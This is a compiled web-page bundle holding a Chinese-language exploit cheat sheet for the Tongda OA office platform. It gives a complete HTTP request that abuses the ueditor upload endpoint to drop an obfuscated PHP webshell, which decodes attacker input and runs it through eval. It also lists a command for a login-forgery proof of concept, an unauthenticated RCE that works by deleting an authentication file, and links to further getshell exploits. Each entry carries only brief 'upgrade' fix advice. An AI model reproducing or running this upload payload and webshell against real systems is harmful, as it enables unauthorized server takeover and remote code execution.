(window.webpackJsonp=window.webpackJsonp||[]).push([[95],{776:function(s,n,a){"use strict";a.r(n);var e=a(103),t=Object(e.a)({},(function(){var s=this,n=s.$createElement,a=s._self._c||n;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"应用简介"}},[s._v("应用简介 "),a("a",{staticClass:"header-anchor",attrs:{href:"#应用简介"}},[s._v("#")])]),s._v(" "),a("p",[a("a",{attrs:{href:"https://www.tongda2000.com/",target:"_blank",rel:"noopener noreferrer"}},[s._v("通达OA"),a("OutboundLink")],1),s._v("，协同办公平台")]),s._v(" "),a("h2",{attrs:{id:"前台任意文件上传"}},[s._v("前台任意文件上传 "),a("a",{staticClass:"header-anchor",attrs:{href:"#前台任意文件上传"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[s._v("#影响版本\n2016-11.6\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("漏洞利用-EXP")])]),s._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token request-line"}},[a("span",{pre:!0,attrs:{class:"token property"}},[s._v("POST")]),s._v(" /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Host:")]),s._v(" 127.0.0.1\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("User-Agent:")]),s._v(" Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept:")]),s._v(" text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept-Language:")]),s._v(" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept-Encoding:")]),s._v(" gzip, deflate\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Type:")]),s._v(" multipart/form-data; boundary=---------------------------157569659620694477453109954647\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Length:")]),s._v(" 879\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Connection:")]),s._v(" close\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Cookie:")]),s._v(" PHPSESSID=t0a1f7nd58egc83cnpv045iua4; KEY_RANDOMDATA=16407\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Upgrade-Insecure-Requests:")]),s._v(" 1\n\n-----------------------------157569659620694477453109954647\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Disposition:")]),s._v(' form-data; name="CONFIG[fileFieldName]"\n\nff\n-----------------------------157569659620694477453109954647\n'),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Disposition:")]),s._v(' form-data; name="CONFIG[fileMaxSize]"\n\n1000000000\n-----------------------------157569659620694477453109954647\n'),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Disposition:")]),s._v(' form-data; name="CONFIG[filePathFormat]"\n\nApi/conf\n-----------------------------157569659620694477453109954647\n'),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Disposition:")]),s._v(' form-data; name="CONFIG[fileAllowFiles][]"\n\n.php\n-----------------------------157569659620694477453109954647\n'),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Disposition:")]),s._v(' form-data; name="ff"; filename="xxxaaaa.php"\n'),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Type:")]),s._v(" text/plain\n\n<?php\n    session_start();\n    @set_time_limit(0);\n\t@error_reporting(0);\n    function E($D,$K){\n        for($i=0;$i<strlen($D);$i++) {\n            $D[$i] = $D[$i]^$K[$i+1&15];\n        }\n        return $D;\n    }\n    function Q($D){\n        return base64_encode($D);\n    }\n    function O($D){\n        return base64_decode($D);\n    }\n    $P='PASS_1z';\n    $V='payload';\n    $T='3c6e0b8a9c15224a';\n    if (isset($_POST[$P])){\n        $F=O(E(O($_POST[$P]),$T));\n        if (isset($_SESSION[$V])){\n            $L=$_SESSION[$V];\n            $A=explode('|',$L);\n            class C{public function nvoke($p) {eval($p.\"\");}}\n            $R=new C();\n\t\t\t$R->nvoke($A[0]);\n            echo substr(md5($P.$T),0,16);\n            echo Q(E(@run($F),$T));\n            echo substr(md5($P.$T),16);\n        }else{\n            $_SESSION[$V]=$F;\n        }\n    }\n\n-----------------------------157569659620694477453109954647\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Disposition:")]),s._v(' form-data; name="mufile"\n\n提交查询\n-----------------------------157569659620694477453109954647--\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br"),a("span",{staticClass:"line-number"},[s._v("72")]),a("br")])]),a("p",[s._v("Webshell地址：127.0.0.1/api/conf.php，exp中api/conf表示api为文件上传后的路径，conf为文件名")]),s._v(" "),a("h2",{attrs:{id:"_11-5-前台任意用户伪造登录漏洞"}},[s._v("[11.5]-前台任意用户伪造登录漏洞 "),a("a",{staticClass:"header-anchor",attrs:{href:"#_11-5-前台任意用户伪造登录漏洞"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("漏洞概述")])]),s._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[s._v("#影响范围\n通达OA < 11.5\n通达OA = 2017\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("strong",[s._v("漏洞利用")])]),s._v(" "),a("p",[s._v("1、使用"),a("a",{attrs:{href:"https://github.com/NS-Sp4ce/TongDaOA-Fake-User#tongdaoa-fake-user",target:"_blank",rel:"noopener noreferrer"}},[s._v("POC"),a("OutboundLink")],1),s._v("获取Cookie")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python3 poc.py -v "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v(" -url http://xxx.com\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("2、浏览器插件"),a("code",[s._v("Cookie-Editor")]),s._v("替换Cookie即可登录")]),s._v(" "),a("p",[a("strong",[s._v("修复建议")])]),s._v(" "),a("p",[s._v("升级到最新版本")]),s._v(" "),a("p",[a("strong",[s._v("11.5（未授权和SQL注入的POC）")])]),s._v(" "),a("p",[s._v("https://4m.cn/1XlPK")]),s._v(" "),a("h2",{attrs:{id:"_11-6-未授权rce-危险操作"}},[s._v("[11.6]-未授权RCE(危险操作) "),a("a",{staticClass:"header-anchor",attrs:{href:"#_11-6-未授权rce-危险操作"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("漏洞概述")])]),s._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[s._v("#影响范围\nV11.6\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传")]),s._v(" "),a("p",[a("strong",[s._v("漏洞利用")])]),s._v(" "),a("p",[s._v("POC下载：https://github.com/TomAPU/poc_and_exp/blob/master/rce.py")]),s._v(" "),a("p",[a("strong",[s._v("修复建议")])]),s._v(" "),a("p",[s._v("升级到最新版本")]),s._v(" "),a("p",[a("strong",[s._v("漏洞分析")])]),s._v(" "),a("p",[s._v("https://xz.aliyun.com/t/8430")]),s._v(" "),a("h2",{attrs:{id:"全版本-文件上传-文件包含getshell"}},[s._v("[全版本]-文件上传+文件包含GetShell "),a("a",{staticClass:"header-anchor",attrs:{href:"#全版本-文件上传-文件包含getshell"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("漏洞概述")])]),s._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[s._v("#影响范围\nV11\n2017\n2016\n2015\n2013\n2013增强版\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("通过绕过身份认证（或弱口令）, 攻击者可上传任意文件，配合文件包含即可出发远程恶意代码执行")]),s._v(" "),a("p",[a("strong",[s._v("漏洞利用")])]),s._v(" "),a("p",[s._v("POC：")]),s._v(" "),a("p",[s._v("https://github.com/ghtwf01/td_rce")]),s._v(" "),a("p",[s._v("https://github.com/php00py/tongdaOA")]),s._v(" "),a("p",[a("strong",[s._v("修复建议")])]),s._v(" "),a("p",[s._v("升级到最新版本")]),s._v(" "),a("p",[a("strong",[s._v("漏洞分析")])]),s._v(" "),a("p",[s._v("https://xz.aliyun.com/t/7437")]),s._v(" "),a("h2",{attrs:{id:"后台getshell"}},[s._v("后台Getshell "),a("a",{staticClass:"header-anchor",attrs:{href:"#后台getshell"}},[s._v("#")])]),s._v(" "),a("p",[s._v("🔸 "),a("a",{attrs:{href:"https://www.cnblogs.com/yuzly/p/13606314.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("通达OA 11.2后台getshell"),a("OutboundLink")],1),s._v("\n🔸 "),a("a",{attrs:{href:"https://www.cnblogs.com/yuzly/p/13690737.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("通达OA 11.7 后台sql注入getshell漏洞"),a("OutboundLink")],1)])])}),[],!1,null,null,null);n.default=t.exports}}]);